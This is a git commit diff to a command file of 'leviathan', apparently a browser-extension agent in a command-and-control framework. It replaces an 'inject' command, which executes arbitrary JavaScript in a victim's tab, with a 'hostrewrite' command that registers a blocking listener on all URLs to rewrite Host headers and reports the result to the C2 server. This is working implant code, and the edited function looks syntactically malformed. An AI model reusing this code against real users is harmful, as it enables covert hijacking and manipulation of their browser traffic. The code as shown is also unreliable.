1ad6da021c2f037781856d7767d2c6e1001b05b4
Dean Hardcastle <dean@canva.com>
2021-08-18 16:37:02 +1000

    made code so it actually works

--- Payload_Type/leviathan/agent_code/commands/hostrewrite.js
+++ Payload_Type/leviathan/agent_code/commands/hostrewrite.js
@@ -1,5 +1,4 @@
-exports.inject = function(task) {
-    // execute custom javascript code in a tab
+exports.hostrewrite = function(task) {
     try {
         let args = JSON.parse(atob(task.parameters.toString()));
         const host = args.host;
@@ -15,16 +14,12 @@ exports.inject = function(task) {
             },
             {urls: ["<all_urls>"]},
             ["blocking", "requestHeaders"]
-          );
 
-
-        chrome.tabs.executeScript(tab, {
-            code: code
-        }, function(){
+          ,function(){
             if (chrome.runtime.lastError) {
                 C2.sendError(taskid, tasktype);
             } else {
-                let response = {"task_id":task.id, "user_output":"injected code into tab with id " + tab, "completed": true};
+                let response = {"task_id":task.id, "user_output":"added listener to rewrite host header with " + host, "completed": true};
                 let outer_response = {"action":"post_response", "responses":[response], "delegates":[]};
                 let enc = JSON.stringify(outer_response);
                 let final = apfell.apfellid + enc;
